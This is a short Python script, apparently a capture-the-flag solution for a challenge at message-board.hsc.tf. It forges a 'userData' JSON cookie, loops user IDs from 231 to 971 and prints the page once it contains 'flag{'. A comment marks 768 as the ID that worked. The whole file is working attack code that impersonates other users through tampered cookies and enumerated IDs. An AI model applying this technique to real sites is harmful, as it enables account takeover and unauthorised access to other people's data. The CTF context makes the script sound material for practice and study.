import requests

for i in range(231, 972):
    cookies = dict(userData=f'j:{{"userID":"{i}","username":"kupatergent"}}')

    url = "https://message-board.hsc.tf/"
    response = requests.get(url, cookies=cookies)
    print(i)
    if "flag{" in response.text:
        #768
        print(response.text)
        break
